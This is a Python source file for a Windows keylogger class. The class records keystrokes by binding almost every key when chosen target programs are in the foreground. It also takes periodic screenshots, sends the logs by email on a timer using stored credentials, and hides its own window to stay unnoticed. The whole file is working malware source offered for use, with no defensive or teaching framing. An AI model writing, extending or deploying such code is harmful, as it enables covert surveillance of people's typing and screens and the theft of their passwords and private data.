import keyboard
import win32con
import win32gui

from buffer import Buffer
from helper import Helper
from log_sender import LogSender
from repeated_timer import RepeatedTimer


class Keylogger:

    def __init__(self, config):
        self.email = config["email"]
        self.password = config["password"]
        self.spy_these_programs = config["spy_these_programs"]
        self.send_logs = config["send_logs"]
        self.send_logs_every = config["send_logs_every"]
        self.take_screenshots = config["take_screenshots"]
        self.time_between_screenshots = config["time_between_screenshots"]
        self.buffer = Buffer()
        self.log_sender = LogSender(self.email, self.password)

        self.__previously_detected_program = None
        self.__detected_something = False
        self.__hotkeys_are_actually_bind = False

    def detector(self):
        """
        This function checks if one of the programs to spy are currently running.
        """

        if Helper.programs_to_spy_are_running(self.spy_these_programs):
            if Helper.get_foreground_window_title() != self.__previously_detected_program:
                self.__previously_detected_program = Helper.get_foreground_window_title()
                self.buffer.write(Helper.get_logging_header())
            self.__detected_something = True
        else:
            self.__detected_something = False

    def bind_keys(self):
        """
        This function adds hotkeys which, when invoked, save the pressed button to the buffer.
        """

        keyboard.add_hotkey('esc', self.buffer.write, args=['esc'])
        keyboard.add_hotkey('F1', self.buffer.write, args=['F1'])
        keyboard.add_hotkey('F2', self.buffer.write, args=['F2'])
        keyboard.add_hotkey('F3', self.buffer.write, args=['F3'])
        keyboard.add_hotkey('F4', self.buffer.write, args=['F4'])
        keyboard.add_hotkey('F5', self.buffer.write, args=['F5'])
        keyboard.add_hotkey('F6', self.buffer.write, args=['F6'])
        keyboard.add_hotkey('F7', self.buffer.write, args=['F7'])
        keyboard.add_hotkey('F8', self.buffer.write, args=['F8'])
        keyboard.add_hotkey('F9', self.buffer.write, args=['F9'])
        keyboard.add_hotkey('F10', self.buffer.write, args=['F10'])
        keyboard.add_hotkey('F11', self.buffer.write, args=['F11'])
        keyboard.add_hotkey('F12', self.buffer.write, args=['F12'])
        keyboard.add_hotkey('print screen', self.buffer.write, args=['PRINT SCREEN'])
        keyboard.add_hotkey('scroll lock', self.buffer.write, args=['SCROLL LOCK'])
        keyboard.add_hotkey('pause', self.buffer.write, args=['PAUSE BREAK'])

        keyboard.add_hotkey('`', self.buffer.write, args=['`'])
        keyboard.add_hotkey('1', self.buffer.write, args=['1'])
        keyboard.add_hotkey('2', self.buffer.write, args=['2'])
        keyboard.add_hotkey('3', self.buffer.write, args=['3'])
        keyboard.add_hotkey('4', self.buffer.write, args=['4'])
        keyboard.add_hotkey('5', self.buffer.write, args=['5'])
        keyboard.add_hotkey('6', self.buffer.write, args=['6'])
        keyboard.add_hotkey('7', self.buffer.write, args=['7'])
        keyboard.add_hotkey('8', self.buffer.write, args=['8'])
        keyboard.add_hotkey('9', self.buffer.write, args=['9'])
        keyboard.add_hotkey('0', self.buffer.write, args=['0'])
        keyboard.add_hotkey('-', self.buffer.write, args=['-'])
        keyboard.add_hotkey('=', self.buffer.write, args=['='])
        keyboard.add_hotkey('\\', self.buffer.write, args=['\\'])
        keyboard.add_hotkey('backspace', self.buffer.write, args=['BS'])
        keyboard.add_hotkey('home', self.buffer.write, args=['HOME'])
        keyboard.add_hotkey('page up', self.buffer.write, args=['PAGE UP'])
        keyboard.add_hotkey('/', self.buffer.write, args=['/'])
        keyboard.add_hotkey('*', self.buffer.write, args=['*'])
        keyboard.add_hotkey('-', self.buffer.write, args=['-'])

        keyboard.add_hotkey('tab', self.buffer.write, args=['TAB'])
        keyboard.add_hotkey('q', self.buffer.write, args=['q'])
        keyboard.add_hotkey('w', self.buffer.write, args=['w'])
        keyboard.add_hotkey('e', self.buffer.write, args=['e'])
        keyboard.add_hotkey('r', self.buffer.write, args=['r'])
        keyboard.add_hotkey('t', self.buffer.write, args=['t'])
        keyboard.add_hotkey('y', self.buffer.write, args=['y'])
        keyboard.add_hotkey('u', self.buffer.write, args=['u'])
        keyboard.add_hotkey('i', self.buffer.write, args=['i'])
        keyboard.add_hotkey('o', self.buffer.write, args=['o'])
        keyboard.add_hotkey('p', self.buffer.write, args=['p'])
        keyboard.add_hotkey('[', self.buffer.write, args=['['])
        keyboard.add_hotkey(']', self.buffer.write, args=[']'])
        keyboard.add_hotkey('enter', self.buffer.write, args=['ENTER'])
        keyboard.add_hotkey('delete', self.buffer.write, args=['DELETE'])
        keyboard.add_hotkey('end', self.buffer.write, args=['END'])
        keyboard.add_hotkey('page down', self.buffer.write, args=['PAGE DOWN'])

        keyboard.add_hotkey('caps lock', self.buffer.write, args=['CAPS LOCK'])
        keyboard.add_hotkey('a', self.buffer.write, args=['a'])
        keyboard.add_hotkey('s', self.buffer.write, args=['s'])
        keyboard.add_hotkey('d', self.buffer.write, args=['d'])
        keyboard.add_hotkey('f', self.buffer.write, args=['f'])
        keyboard.add_hotkey('g', self.buffer.write, args=['g'])
        keyboard.add_hotkey('h', self.buffer.write, args=['h'])
        keyboard.add_hotkey('j', self.buffer.write, args=['j'])
        keyboard.add_hotkey('k', self.buffer.write, args=['k'])
        keyboard.add_hotkey('l', self.buffer.write, args=['l'])
        keyboard.add_hotkey(';', self.buffer.write, args=[';'])
        keyboard.add_hotkey('\'', self.buffer.write, args=['\''])

        keyboard.add_hotkey('left shift', self.buffer.write, args=["LEFT SHIFT"])
        keyboard.add_hotkey('z', self.buffer.write, args=['z'])
        keyboard.add_hotkey('x', self.buffer.write, args=['x'])
        keyboard.add_hotkey('c', self.buffer.write, args=['c'])
        keyboard.add_hotkey('v', self.buffer.write, args=['v'])
        keyboard.add_hotkey('b', self.buffer.write, args=['b'])
        keyboard.add_hotkey('n', self.buffer.write, args=['n'])
        keyboard.add_hotkey('m', self.buffer.write, args=['m'])
        keyboard.add_hotkey(',', self.buffer.write, args=[','])
        keyboard.add_hotkey('.', self.buffer.write, args=['.'])
        keyboard.add_hotkey('/', self.buffer.write, args=['/'])
        keyboard.add_hotkey('right shift', self.buffer.write, args=['RIGHT SHIFT'])
        keyboard.add_hotkey('up', self.buffer.write, args=['ARROW UP'])

        keyboard.add_hotkey('left ctrl', self.buffer.write, args=['LEFT CTRL'])
        keyboard.add_hotkey('left windows', self.buffer.write, args=['LEFT WINDOWS'])
        keyboard.add_hotkey('left alt', self.buffer.write, args=['LEFT ALT'])
        keyboard.add_hotkey('space', self.buffer.write, args=[' '])
        keyboard.add_hotkey('right alt', self.buffer.write, args=['RIGHT ALT'])
        keyboard.add_hotkey('right windows', self.buffer.write, args=['RIGHT WINDOWS'])
        keyboard.add_hotkey('right ctrl', self.buffer.write, args=['RIGHT CTRL'])
        keyboard.add_hotkey('left', self.buffer.write, args=['ARROW LEFT'])
        keyboard.add_hotkey('down', self.buffer.write, args=['ARROW DOWN'])
        keyboard.add_hotkey('right', self.buffer.write, args=['ARROW RIGHT'])

    def capture_keystrokes(self):
        """
        This function will invoke a function called bind_keys if detector detects one of the programs to spy
        are currently running. If there are no programs to spy, then this function will unbind all hotkeys.
        """

        if self.__detected_something and not self.__hotkeys_are_actually_bind:
            self.bind_keys()
            self.__hotkeys_are_actually_bind = True

        elif not self.__detected_something and self.__hotkeys_are_actually_bind:
            keyboard.clear_all_hotkeys()
            self.__hotkeys_are_actually_bind = False

    def print_screen(self):
        """
        This function will take a screenshot only when the detector detects that at least one of the
        programs to spy are currently running.
        """

        if self.__detected_something:
            Helper.print_screen()

    def run(self):
        """
        This function starts the keylogger.
        """

        detector = RepeatedTimer(0.05, self.detector)
        detector.start()

        interceptor = RepeatedTimer(0.07, self.capture_keystrokes)
        interceptor.start()

        if self.take_screenshots:
            photographer = RepeatedTimer(self.time_between_screenshots, self.print_screen)
            photographer.start()

        if self.send_logs:
            postman = RepeatedTimer(self.send_logs_every, self.log_sender.send_logs)
            postman.start()

        # Hide current window
        hide = win32gui.GetForegroundWindow()
        win32gui.ShowWindow(hide, win32con.SW_HIDE)
